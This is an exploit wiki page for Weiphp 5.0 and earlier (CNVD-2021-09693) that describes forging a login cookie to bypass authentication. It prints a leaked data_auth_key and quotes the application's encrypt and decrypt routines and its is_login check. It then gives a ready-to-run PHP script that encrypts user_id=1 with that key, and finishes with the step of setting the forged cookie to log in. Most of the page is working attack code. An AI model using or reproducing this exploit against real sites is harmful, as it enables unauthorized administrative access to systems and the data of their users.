<languages  />

Vulnerability Impact
--------------------

    Weiphp <= 5.0

Exploit
-------

First, you need to get the `data_auth_key` key in the database configuration file

![](Weiphp-15.png "Weiphp-15.png")

To get this configuration file, please refer to [%BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E CNVD-2020-68596 Weiphp5.0 front file Arbitrary read vulnerability](https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4)

    'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T'

Find the place where this key is used globally:

![](Weiphp-16.png "Weiphp-16.png")

Found the encryption method and decryption method based on this key

Encryption method `think_encrypt`


    function think_encrypt($data, $key = '', $expire = 0)
    {
        $key = md5(empty($key) ? config('database.data_auth_key') : $key);

        $data = base64_encode($data);
        $x = 0;
        $len = strlen($data);
        $l = strlen($key);
        $char = '';

        for ($i = 0; $i < $len; $i++) {
            if ($x == $l) {
                $x = 0;
            }

            $char .= substr($key, $x, 1);
            $x++;
        }

        $str = sprintf('%010d', $expire ? $expire + time() : 0);

        for ($i = 0; $i < $len; $i++) {
            $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
        }
        return str_replace(array(
            '+',
            '/',
            '='
        ), array(
            '-',
            '_',
            ''
        ), base64_encode($str));
    }

Decryption method `think_decrypt`

    function think_decrypt($data, $key = '')
    {
        $key = md5(empty($key) ? config('database.data_auth_key') : $key);
        $data = str_replace(array(
            '-',
            '_'
        ), array(
            '+',
            '/'
        ), $data);
        $mod4 = strlen($data) % 4;
        if ($mod4) {
            $data .= substr('====', $mod4);
        }
        $data = base64_decode($data);
        $expire = substr($data, 0, 10);
        $data = substr($data, 10);

        if ($expire > 0 && $expire < time()) {
            return '';
        }
        $x = 0;
        $len = strlen($data);
        $l = strlen($key);
        $char = $str = '';

        for ($i = 0; $i < $len; $i++) {
            if ($x == $l) {
                $x = 0;
            }

            $char .= substr($key, $x, 1);
            $x++;
        }

        for ($i = 0; $i < $len; $i++) {
            if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
                $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
            } else {
                $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
            }
        }
        return base64_decode($str);
    }

The file `application\common.php` contains the code to use the decryption method for authentication

    function is_login()
    {
        $user = session('user_auth');
        if (empty($user)) {
            $cookie_uid = cookie('user_id');
            if (!empty($cookie_uid)) {
                $uid = think_decrypt($cookie_uid);
                $userinfo = getUserInfo($uid);
                D('common/User')->autoLogin($userinfo);

                $user = session('user_auth');
            }
        }
        if (empty($user)) {
            return 0;
        } else {
            return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
        }
    }

According to the code obtained here, you can know that when user_Id=1, the key will be decrypted to determine whether it is correct, and if it is correct, you can log in to the system

We can log in to the system by encrypting the cookie obtained with user_id=1 with an encryption code locally

    <?php
    show_source(__FILE__);
    function think_encrypt($data, $key = '', $expire = 0)
    {
        $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T';
        $key = md5($key);

        $data = base64_encode($data);
        $x = 0;
        $len = strlen($data);
        $l = strlen($key);
        $char = '';

        for ($i = 0; $i < $len; $i++) {
            if ($x == $l) {
                $x = 0;
            }

            $char .= substr($key, $x, 1);
            $x++;
        }

        $str = sprintf('%010d', $expire ? $expire + time() : 0);

        for ($i = 0; $i < $len; $i++) {
            $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
        }
        return str_replace(array(
            '+',
            '/',
            '='
        ), array(
            '-',
            '_',
            ''
        ), base64_encode($str));
    }

    echo 'user_id = ' . think_encrypt($_GET['user_id']);
    ?>

Add `cookie: user_id=xxxxxxxx` to log in successfully

![](Weiphp-18.png "Weiphp-18.png")

Reference
---------

<http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html>